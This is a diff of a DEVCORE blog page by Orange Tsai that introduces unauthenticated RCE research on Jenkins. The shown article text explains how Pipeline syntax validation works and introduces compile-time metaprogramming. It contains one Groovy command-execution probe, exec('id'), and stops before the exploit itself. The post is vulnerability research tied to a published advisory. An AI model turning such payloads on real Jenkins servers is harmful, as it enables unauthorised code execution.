@@ -1,116 +1,498 @@
 
+
 <!DOCTYPE html>
-<html lang="zh-TW">
-  <head>
+<html class="no-js sub-menu">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     <meta charset="utf-8" />
-    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible" />
-    <meta content="width=device-width, initial-scale=1" name="viewport" />
-    <title>Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!(EN) | DEVCORE</title><link href="/assets/themes/devcore-v2/stylesheets/webpack_bundle.css" rel="stylesheet" />
-    <link href="/assets/themes/devcore-v2/images/favicon.png" rel="icon" size="32x32">
-    <meta name="description" property="og:description" content="After Jenkins released the [Security Advisory](https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595) and fixed the dynamic routing vulnerability on 2018-12-05, I started to organize my notes in order to write this Hacking Jenkins series. While reviewing notes, I found another exploitation way on a gadget that I failed to exploit before! Therefore, the part two is the story for that! This is also one of my favorite exploits and is really worth reading :)" />
-    <meta name="keywords" content="Advisory, Jenkins, RCE, CVE-2019-1003000" />
-    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
-    <meta property="og:title" content="Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!(EN) | DEVCORE 戴夫寇爾" />
-    <meta property="og:url" content="https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/" />
-    <meta property="og:type" content="website" />
-    <meta property="og:image" content="https://devco.re/assets/img/blog/20190219/cover.png" />
-    <meta name="twitter:card" content="summary">
-    <meta name="twitter:site" content="d3vc0r3">
-    <meta name="twitter:title" content="Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!(EN) | DEVCORE 戴夫寇爾">
-    <meta name="twitter:description" content="After Jenkins released the [Security Advisory](https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595) and fixed the dynamic routing vulnerability on 2018-12-05, I started to organize my notes in order to write this Hacking Jenkins series. While reviewing notes, I found another exploitation way on a gadget that I failed to exploit before! Therefore, the part two is the story for that! This is also one of my favorite exploits and is really worth reading :)">
-    <meta name="twitter:creator" content="d3vc0r3">
-    <meta name="twitter:image:src" content="https://devco.re/assets/img/blog/20190219/cover.png">
-    <meta name="twitter:domain" content="devco.re">
-    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
-    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
-    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
-    <meta name='yandex-verification' content='4561963cf1d18fe3' />
-    <meta property="fb:admins" content="120968921404653" />
+    <!-- web fullscreen -->
+    <meta name="apple-mobile-web-app-capable" content="yes"><!-- ios -->
+    <meta name="mobile-web-app-capable" content="yes"><!-- android -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0" />
+    <meta name="format-detection" content="telephone=no">
+    <title>Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!(EN) | DEVCORE</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <script src="/js/modernizr-custom.js"></script>
+    <script src="/js/jquery-3.6.0.min.js"></script>
+    <script src="/js/site.js"></script>
+    <link rel="stylesheet" href="/fonts/inter.css" />
+    <link rel="stylesheet" href="/css/highlighter.css" />
+    <!-- <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script> -->
+</head>
+<body class="en">
+    <!-- 導覽列 start -->
+    <header class="header">
+<div class="container">
+    <!-- logo start -->
+    <div class="logo">
+        <a href="/en/">
+            <img src="/images/logo.svg"/>
+        </a>
+    </div>
+    <!-- logo end -->
+    <!-- 主選單 start -->
+    <nav class="nav">
+        <ul class="menu">
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>Services<i class="icon arrow_down"></i></span>
 
-    <link rel="canonical" href="https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/"/>
-    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">
+                    <div class="menuItem">
+                        <a href="/en/services/red-team/">
+                            <div class="item">
 
-    <!-- Google Tag Manager -->
-    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
-    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
-    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
-    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
-    })(window,document,'script','dataLayer','GTM-K5B8NW');</script>
-    <!-- End Google Tag Manager -->
-  </head>
-  <body>
-    <div class="page">
-      <div class="container--wrapper">
-        <div class="topbar">
-          <div class="topbar__brand">
-            <a href="/en/">
-                <div class="logo">
-                  DEVCORE
-                </div></a>
-            <p class="slogan">
-              We offer professional <a href="/en/services/penetration-test" class="link">pentesting</a>, <a href="/en/services/red-team" class="link">red teaming</a>, <a href="/en/services/security-consulting" class="link">consulting</a>, and <a href="/en/services/security-training" class="link">training</a> services
-            </p>
-          </div>
-          <div class="drawer" id="drawer">
-            <div class="drawer__container">
-              <nav class="main-menu">
-                <div class="hidden">
-                  Menu
+                                <h2>
+                                    <i class="icon menu service-red-team"></i>
+                                    Red Team Assessment
+                                </h2>
+                                <p class="two-line">
+                                    Perform comprehensive attack simulation from unlimited aspects to achieve the designated drill scenario without impacting enterprise operations.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/services/penetration-test/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-penetration-test"></i>
+                                    Penetration Testing
+                                </h2>
+                                <p class="two-line">
+                                    Infiltrate designated enterprise systems with hacker mindset and techniques to uncover potential vulnerabilities, assessing the risk of breach or damage to enterprise assets.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/services/security-consulting/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-security-consulting"></i>
+                                    Security Consulting
+                                </h2>
+                                <p class="two-line">
+                                    Assist enterprises in resource distribution and long-term defensive strategy development from the attacker's perspective based on red team assessment.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/services/security-training/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-security-training"></i>
+                                    Security Training
+                                </h2>
+                                <p class="two-line">
+                                    Assist enterprises in defending and preventing incidents efficiently from the attacker's perspective, including response procedures and analysis of attack targets, techniques, and vulnerabilities.
+                                </p>
+                            </div>
+                        </a>
+
+                    </div>
                 </div>
-                <a href="/en/services/penetration-test" class="main-menu__link mobile-only">Penetration Testing</a>
-                <a href="/en/services/red-team" class="main-menu__link mobile-only">Red Team Assessment</a>
-                <a href="/en/services/security-consulting" class="main-menu__link mobile-only">Consulting</a>
-                <a href="/en/services/security-training" class="main-menu__link mobile-only">Training</a>
-                <a href="/en/about/" class="main-menu__link">Hackers</a><a href="/en/blog/" class="main-menu__link">News</a><a href="/en/search/" class="main-menu__link main-menu__search desktop-only"><span class="hidden">Search</span><svg class="icon-search icon"><use xlink:href="#icon-search" /></svg></a>
-              </nav>
-              <a href="/en/contact/" class="drawer__contact button--dense">Contact</a>
-              <nav class="lang-menu">
-                <div class="lang-menu__label">
-                  Lang:
+            </li>
+
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>Research<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/en/research/overview/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu search-circle"></i>
+                                    Overview
+                                </h2>
+                                <p class="two-line">
+                                    Research leading cybersecurity techniques and trends, perform comprehensive security assessments of enterprise products, and evolve the red team with broad experience.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/awards/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu badge-check"></i>
+                                    Competitions and Awards
+                                </h2>
+                                <p class="two-line">
+                                    Awards from international cybersecurity competitions.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/bug-bounty/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu puzzle"></i>
+                                    Enterprise Vulnerability Reports
+                                </h2>
+                                <p class="two-line">
+                                    Research into the risk of enterprise systems, identify potential weaknesses, and report to vendors.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/talks/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu globe"></i>
+                                    International Conferences
+                                </h2>
+                                <p class="two-line">
+                                    Publish vulnerability research and share security knowledge at international cybersecurity conferences.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/cve/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu view-list"></i>
+                                    CVE List
+                                </h2>
+                                <p class="two-line">
+                                    Uncover and report critical vulnerabilities in leading international products and services.
+                                </p>
+                            </div>
+                        </a>
+                    </div>
                 </div>
-                <a href="/" class="lang-menu__link">中文</a>
-                <a href="/en/" class="lang-menu__link">English</a>
-              </nav>
+
+
+            </li>
+
+            <li class="dropdown">
+                <div class="menuLable" href="#">
+                    <span>Company<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/en/company/about/">
+                        <div class="item">
+                            <h2>
+                                <i class="icon menu company"></i>
+                                Company Overview
+                            </h2>
+                            <p>
+                                DEVCORE was founded by a world-class white hat hacker team, providing cybersecurity services and focusing on Red Team Assessment and Penetration Testing services.
+                            </p>
+                        </div>
+                        </a>
+                        <a href="/en/company/our-team/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu team"></i>
+                                    Team Members
+                                </h2>
+                                <p class="two-line">
+                                    A team of experts with a hacker mindset, exploring new exploitation techniques, and upholding strict morality, self-discipline, and caution.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/company/history/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu milestone"></i>
+                                    Achievements
+                                </h2>
+                                <p class="two-line">
+                                    The history, research achievements, and award information of DEVCORE.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/company/csr/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu heart"></i>
+                                    Corporate Social Responsibility
+                                </h2>
+                                <p class="two-line">
+                                    Provide diverse internship channels and scholarship programs to nurture the next generation and promote cybersecurity awareness.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/company/jobs/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu briefcase"></i>
+                                    Job Opportunities
+                                </h2>
+                                <p class="two-line">
+                                    Join us to secure the world and improve the cybersecurity industry together.
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </li>
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>News<i class="icon arrow_down"></i></span>
+                    <div class="menuItem">
+                        <a href="/en/blog/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu newspaper"></i>
+                                    BLOG
+                                </h2>
+                                <p>
+                                    Latest news
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/media-kit/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu download"></i>
+                                    Media Resources
+                                </h2>
+                                <p>
+                                    Guidelines for the use of the DEVCORE trademark.
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </li>
+            <li>
+                <a class="menuLable" href="/en/search/">Search</a>
+            </li>
+            <li>
+                <a class="menuLable" href="/en/contact/">Contact</a>
+            </li>
+        </ul>
+    </nav>
+    <!-- 主選單 end -->
+</div>
+
+
+<!-- 手機板選單  start-->
+<nav class="nav-m" id="menu-m">
+    <ul class="menu">
+        <li>
+            <div class="menuLable">
+                <span>Services</span>
+                <div class="menuItem">
+                    <a href="/en/services/red-team/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-red-team"></i>
+                                Red Team Assessment
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/services/penetration-test/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-penetration-test"></i>
+                                Penetration Testing
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/services/security-consulting/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-security-consulting"></i>
+                                Security Consulting
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/services/security-training/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-security-training"></i>
+                                Security Training
+                            </h2>
+                        </div>
+                    </a>
+                </div>
             </div>
-          </div><span class="topbar__menu mobile-only">menu</span><button class="appearance-none topbar__hamburger mobile-only" data-toggle="#drawer" id="drawer-toggle" type="button">
-            <div class="bars">
-              <div class="bar"></div>
-              <div class="bar"></div>
-              <div class="bar"></div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span>Research</span>
+                <div class="menuItem">
+                    <a href="/en/research/overview/" class="fullwidth">
+                        <div class="item">
+                            <h2>Overview</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/awards/">
+                        <div class="item">
+                            <h2>Competitions and Awards</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/bug-bounty/">
+                        <div class="item">
+                            <h2>Enterprise Vulnerability Reports</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/talks/">
+                        <div class="item">
+                            <h2>International Conferences</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/cve/">
+                        <div class="item">
+                            <h2>CVE List</h2>
+                        </div>
+                    </a>
+                </div>
             </div>
-          </button>
+        </li>
+
+        <li>
+            <div class="menuLable">
+                <span>Company</span>
+                <div class="menuItem">
+                    <a href="/en/company/about/" class="fullwidth">
+                        <div class="item">
+                            <h2>Company Overview</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/our-team/">
+                        <div class="item">
+                            <h2>Team Members</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/history/">
+                        <div class="item">
+                            <h2>Achievements</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/csr/">
+                        <div class="item">
+                            <h2>Corporate Social Responsibility</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/jobs/">
+                        <div class="item">
+                            <h2>Job Opportunities</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span>News</span>
+                <div class="menuItem">
+                    <a href="/en/blog/">
+                        <div class="item">
+                            <h2>BLOG</h2>
+                        </div>
+                    </a>
+                    <a href="/en/media-kit/">
+                        <div class="item">
+                            <h2>Media Resources</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <div class="menuItem">
+                    <a href="/en/search/" class="fullwidth">
+                        <div class="item">
+                            <h2 class="center">
+                                <i class="icon search"></i>
+                                Search
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/contact/" class="fullwidth">
+                        <div class="item">
+                            <h2 class="center">
+                                <i class="icon chat-alt"></i>
+                                Contact
+                            </h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span><i class="icon translate"></i>Language</span>
+                <div class="menuItem">
+                    <a href="/">
+                    <div class="item">
+                        <h2>中文</h2>
+                    </div>
+                    </a>
+                    <a href="/en">
+                        <div class="item">
+                            <h2>English</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+    </ul>
+</nav>
+<!-- 手機板選單  end-->
+    </header>
+    <!-- 導覽列 end -->
+
+    <!-- tab 選單 start -->
+    <div class="sub-nav">
+        <div class="container">
+            <h1>BLOG</h1>
+            <ul class="tab">
+                <li>
+                    <a href="/en/blog/">All Articles</a>
+                </li>
+                <li>
+                    <a href="/en/blog/category/Tech%20Editorials/">Tech Editorials</a>
+                </li>
+                <li>
+                    <a href="/en/media-kit/">Media Resources</a>
+                </li>
+            </ul>
         </div>
-      </div><main role="main">
+    </div>
+    <!-- tab 選單 end -->
+    
+    <div class="main">
+        <!-- 文章外層layer -->
+        <section class="narrow">
+            <!-- 文章 start -->
+            <article class="article_body">
+                <div class="content">
+                    <a class="category" href="/en/blog/category/Tech Editorials">Tech Editorials</a>
+                    <span class="tag">
 
+                      <a href="/en/blog/tag/Advisory/">#Advisory</a> <a href="/en/blog/tag/CVE/">#CVE</a> <a href="/en/blog/tag/RCE/">#RCE</a> 
+                    </span>
+                    <h1>
+                        Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!(EN)
+                    </h1>
+                    
+                    
+                    <div class="author_detail">
+                        <span class="avatar">
+                            <a href="/en/blog/author/orange">
+                                <div class="circle">
+                                    <i class="user" style="background-image: url('/assets/img/avatar/orig/orange.png');" ></i>
+                                </div>
+                            </a>
+                        </span>
+                        <span class="author"><a href="/en/blog/author/orange">Orange Tsai</a></span>
+                        <span class="date">2019-02-19</span>
+                    </div>
+                    
+                    
+                    <div class="article_img">
+                        <img src="https://devco.re/assets/img/blog/20190219/cover.png"/>
+                    </div>
+                    
 
-          <div class="container--wrapper">
-            <div class="container">
-              <section class="blog-header">
-                <small class="blog-header__category"><a href="/en/blog/category/Tech Editorials/" style="text-transform: uppercase;">Tech Editorials</a></small>
-                <img src="https://devco.re/assets/img/blog/20190219/cover.png" class="blog-header__image" alt="Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!(EN)" />
-                <h1 class="blog-header__title">
-                  Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!(EN)
-                </h1>
-                <div class="blog-header__tags">
-                  
-                  <a href="/en/blog/tag/Advisory/" class="blog-header__tag">Advisory</a><a href="/en/blog/tag/CVE/" class="blog-header__tag">CVE</a><a href="/en/blog/tag/RCE/" class="blog-header__tag">RCE</a>
-                </div>
-          
-          
-                <p class="blog-header__info">
-                  By <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/orangetsai.jpg)"></span> <a href="/en/blog/author/orange" class="author-name">Orange Tsai</a> <time class="date">on 2019-02-19 </time>
-                </p>
-          
-              </section>
-              <article class="article">
-          <p><a href="/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/">English Version</a><br />
+                    <hr>
+
+                    <!-- 文章內容 -->
+                    <div class="article_content">
+<p><a href="/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/">English Version</a>
 <a href="/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/">中文版本</a></p>
 
 <p>Hello everyone!</p>
 
 <p>This is the Hacking Jenkins series part two! For those people who still have not read the part one yet, you can check the following link to get some basis and see how vulnerable Jenkins’ dynamic routing is!</p>
 <ul>
-  <li><a href="https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/">Hacking Jenkins Part 1 - Play with Dynamic Routing<br />
+  <li><a href="https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/">Hacking Jenkins Part 1 - Play with Dynamic Routing
 </a></li>
 </ul>
 
@@ -129,26 +511,26 @@
 
 <p>As we mentioned before, Pipeline is just a DSL built with Groovy, so Pipeline must follow the Groovy syntax! If the Groovy parser can deal with the Pipeline script without errors, the syntax must be correct! The code fragments here shows how Jenkins validates the Pipeline:</p>
 
-<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="n">JSON</span> <span class="nf">doCheckScriptCompile</span><span class="o">(</span><span class="nd">@QueryParameter</span> <span class="n">String</span> <span class="n">value</span><span class="o">)</span> <span class="o">{</span>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="no">JSON</span> <span class="nf">doCheckScriptCompile</span><span class="o">(</span><span class="nd">@QueryParameter</span> <span class="nc">String</span> <span class="n">value</span><span class="o">)</span> <span class="o">{</span>
     <span class="k">try</span> <span class="o">{</span>
-        <span class="n">CpsGroovyShell</span> <span class="n">trusted</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CpsGroovyShellFactory</span><span class="o">(</span><span class="kc">null</span><span class="o">).</span><span class="na">forTrusted</span><span class="o">().</span><span class="na">build</span><span class="o">();</span>
+        <span class="nc">CpsGroovyShell</span> <span class="n">trusted</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">CpsGroovyShellFactory</span><span class="o">(</span><span class="kc">null</span><span class="o">).</span><span class="na">forTrusted</span><span class="o">().</span><span class="na">build</span><span class="o">();</span>
         <span class="k">new</span> <span class="nf">CpsGroovyShellFactory</span><span class="o">(</span><span class="kc">null</span><span class="o">).</span><span class="na">withParent</span><span class="o">(</span><span class="n">trusted</span><span class="o">).</span><span class="na">build</span><span class="o">().</span><span class="na">getClassLoader</span><span class="o">().</span><span class="na">parseClass</span><span class="o">(</span><span class="n">value</span><span class="o">);</span>
-    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">CompilationFailedException</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
-        <span class="k">return</span> <span class="n">JSONArray</span><span class="o">.</span><span class="na">fromObject</span><span class="o">(</span><span class="n">CpsFlowDefinitionValidator</span><span class="o">.</span><span class="na">toCheckStatus</span><span class="o">(</span><span class="n">x</span><span class="o">).</span><span class="na">toArray</span><span class="o">());</span>
+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">CompilationFailedException</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="nc">JSONArray</span><span class="o">.</span><span class="na">fromObject</span><span class="o">(</span><span class="nc">CpsFlowDefinitionValidator</span><span class="o">.</span><span class="na">toCheckStatus</span><span class="o">(</span><span class="n">x</span><span class="o">).</span><span class="na">toArray</span><span class="o">());</span>
     <span class="o">}</span>
-    <span class="k">return</span> <span class="n">CpsFlowDefinitionValidator</span><span class="o">.</span><span class="na">CheckStatus</span><span class="o">.</span><span class="na">SUCCESS</span><span class="o">.</span><span class="na">asJSON</span><span class="o">();</span>
+    <span class="k">return</span> <span class="nc">CpsFlowDefinitionValidator</span><span class="o">.</span><span class="na">CheckStatus</span><span class="o">.</span><span class="na">SUCCESS</span><span class="o">.</span><span class="na">asJSON</span><span class="o">();</span>
     <span class="c1">// Approval requirements are managed by regular stapler form validation (via doCheckScript)</span>
 <span class="o">}</span>
 </code></pre></div></div>
 
-<p>Here Jenkins validates the Pipeline with the method <a href="http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-">GroovyClassLoader.parseClass(…)</a>! It should be noted that this is just an AST parsing. Without running <code class="highlighter-rouge">execute()</code> method, any dangerous invocation won’t be executed! If you try to parse the following Groovy script, you get nothing :(</p>
+<p>Here Jenkins validates the Pipeline with the method <a href="http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-">GroovyClassLoader.parseClass(…)</a>! It should be noted that this is just an AST parsing. Without running <code class="language-plaintext highlighter-rouge">execute()</code> method, any dangerous invocation won’t be executed! If you try to parse the following Groovy script, you get nothing :(</p>
 
 <div class="language-groovy highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">this</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">classLoader</span><span class="o">.</span><span class="na">parseClass</span><span class="o">(</span><span class="s1">'''
 print java.lang.Runtime.getRuntime().exec("id")
 '''</span><span class="o">);</span>
 </code></pre></div></div>
 
-<p>From the view of developers, the Pipeline can control Jenkins, so it must be dangerous and requires a strict permission check before every Pipeline invocation! However, this is just a simple syntax validation so the permission check here is more less than usual! Without any <code class="highlighter-rouge">execute()</code> method, it’s just an AST parser and must be safe! This is what I thought when the first time I saw this validation. However, while I was writing the technique blog, Meta-Programming flashed into my mind!</p>
+<p>From the view of developers, the Pipeline can control Jenkins, so it must be dangerous and requires a strict permission check before every Pipeline invocation! However, this is just a simple syntax validation so the permission check here is more less than usual! Without any <code class="language-plaintext highlighter-rouge">execute()</code> method, it’s just an AST parser and must be safe! This is what I thought when the first time I saw this validation. However, while I was writing the technique blog, Meta-Programming flashed into my mind!</p>
 
 <p><br /></p>
 
@@ -157,7 +539,7 @@ print java.lang.Runtime.getRuntime().exec("id")
 
 <p>Meta-Programming is a kind of programming concept! The idea of Meta-Programming is providing an abstract layer for programmers to consider the program in a different way, and makes the program more flexible and efficient! There is no clear definition of Meta-Programming. In general, both processing the program by itself and writing programs that operate on other programs(compiler, interpreter or preprocessor…) are Meta-Programming! The philosophy here is very profound and could even be a big subject on Programming Language!</p>
 
-<p>If it is still hard to understand, you can just regard <code class="highlighter-rouge">eval(...)</code> as another Meta-Programming, which lets you operate the program on the fly. Although it’s a little bit inaccurate, it’s still a good metaphor for understanding! In software engineering, there are also lots of techniques related to Meta-Programming. For example:</p>
+<p>If it is still hard to understand, you can just regard <code class="language-plaintext highlighter-rouge">eval(...)</code> as another Meta-Programming, which lets you operate the program on the fly. Although it’s a little bit inaccurate, it’s still a good metaphor for understanding! In software engineering, there are also lots of techniques related to Meta-Programming. For example:</p>
 
 <ul>
   <li>C Macro</li>
@@ -169,7 +551,7 @@ print java.lang.Runtime.getRuntime().exec("id")
 
 <p>When we are talking about Meta-Programming, we classify it into <strong>(1)compile-time</strong> and <strong>(2)run-time Meta-Programming</strong> according to the scope. Today, we focus on the compile-time Meta-Programming!</p>
 
-<p><em>P.S. It’s hard to explain Meta-Programming in non-native language. If you are interested, here are some materials! <a href="https://en.wikipedia.org/wiki/Metaprogramming">Wiki</a>, <a href="https://stackoverflow.com/questions/2565572/metaprogramming-self-explanatory-code-tutorials-articles-books/2566561#2566561">Ref1</a>, <a href="http://cs.lmu.edu/~ray/notes/metaprogramming/">Ref2</a></em><br />
+<p><em>P.S. It’s hard to explain Meta-Programming in non-native language. If you are interested, here are some materials! <a href="https://en.wikipedia.org/wiki/Metaprogramming">Wiki</a>, <a href="https://stackoverflow.com/questions/2565572/metaprogramming-self-explanatory-code-tutorials-articles-books/2566561#2566561">Ref1</a>, <a href="http://cs.lmu.edu/~ray/notes/metaprogramming/">Ref2</a></em>
 <em>P.S. I am not a programming language master, if there is anything incorrect or inaccurate, please forgive me &lt;(_ _)&gt;</em></p>
 
 <p><br /></p>
@@ -196,14 +578,14 @@ print java.lang.Runtime.getRuntime().exec("id")
 
 <p>or calculating the Fibonacci number by compiler</p>
 
-<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">template</span><span class="o">&lt;</span><span class="kt">int</span> <span class="n">n</span><span class="o">&gt;</span>
-<span class="k">struct</span> <span class="n">fib</span> <span class="p">{</span>
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">template</span><span class="o">&lt;</span><span class="kt">int</span> <span class="n">n</span><span class="p">&gt;</span>
+<span class="k">struct</span> <span class="nc">fib</span> <span class="p">{</span>
     <span class="k">static</span> <span class="k">const</span> <span class="kt">int</span> <span class="n">value</span> <span class="o">=</span> <span class="n">fib</span><span class="o">&lt;</span><span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="o">&gt;::</span><span class="n">value</span> <span class="o">+</span> <span class="n">fib</span><span class="o">&lt;</span><span class="n">n</span><span class="o">-</span><span class="mi">2</span><span class="o">&gt;::</span><span class="n">value</span><span class="p">;</span>
 <span class="p">};</span>
-<span class="k">template</span><span class="o">&lt;&gt;</span> <span class="k">struct</span> <span class="n">fib</span><span class="o">&lt;</span><span class="mi">0</span><span class="o">&gt;</span> <span class="p">{</span> <span class="k">static</span> <span class="k">const</span> <span class="kt">int</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">};</span>
-<span class="k">template</span><span class="o">&lt;&gt;</span> <span class="k">struct</span> <span class="n">fib</span><span class="o">&lt;</span><span class="mi">1</span><span class="o">&gt;</span> <span class="p">{</span> <span class="k">static</span> <span class="k">const</span> <span class="kt">int</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="p">};</span>
+<span class="k">template</span><span class="o">&lt;</span><span class="p">&gt;</span> <span class="k">struct</span> <span class="nc">fib</span><span class="o">&lt;</span><span class="mi">0</span><span class="o">&gt;</span> <span class="p">{</span> <span class="k">static</span> <span class="k">const</span> <span class="kt">int</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">};</span>
+<span class="k">template</span><span class="o">&lt;</span><span class="p">&gt;</span> <span class="k">struct</span> <span class="nc">fib</span><span class="o">&lt;</span><span class="mi">1</span><span class="o">&gt;</span> <span class="p">{</span> <span class="k">static</span> <span class="k">const</span> <span class="kt">int</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="p">};</span>
 
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+<span class="kt">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
     <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="n">fib</span><span class="o">&lt;</span><span class="mi">10</span><span class="o">&gt;::</span><span class="n">value</span><span class="p">;</span> <span class="c1">// 55</span>
     <span class="kt">int</span> <span class="n">b</span> <span class="o">=</span> <span class="n">fib</span><span class="o">&lt;</span><span class="mi">20</span><span class="o">&gt;::</span><span class="n">value</span><span class="p">;</span> <span class="c1">// 6765</span>
     <span class="kt">int</span> <span class="n">c</span> <span class="o">=</span> <span class="n">fib</span><span class="o">&lt;</span><span class="mi">40</span><span class="o">&gt;::</span><span class="n">value</span><span class="p">;</span> <span class="c1">// 102334155</span>
@@ -235,10 +617,10 @@ print java.lang.Runtime.getRuntime().exec("id")
 <h3 id="first-attempt">First Attempt</h3>
 <hr />
 
